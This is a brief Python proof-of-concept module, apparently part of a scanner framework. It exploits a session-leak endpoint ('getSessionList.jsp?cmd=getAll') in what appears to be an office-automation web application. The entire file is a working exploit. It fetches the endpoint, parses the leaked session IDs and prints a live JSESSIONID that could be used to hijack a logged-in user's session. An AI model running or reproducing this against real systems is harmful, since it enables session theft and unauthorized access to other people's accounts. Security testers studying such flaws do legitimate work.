# -*- coding: utf-8 -*-

from poc import core
import requests
from bs4 import BeautifulSoup
def get_sessionlist(url):
    name='getSessionList.jsp session 泄露'
    core.start_echo(name)
    path='/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
    r=core.get(url,path)
    if r:
        if r.status_code==200 and  "<sessionID>" in r.text:
            soup=BeautifulSoup(r.text,'lxml')
            sessions=soup.find_all('sessionid')
            print('\033[32m[#]成功获取到{}个session，第一个为：JSESSIONID={}\033[0m'.format(len(sessions)+1,sessions[0].string.strip('\n\r')))
            core.end_echo(name,'Payload：'+url+path)
            core.result(name,url+path,'JSESSIONID='+sessions[0].string.strip('\n\r'))
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)


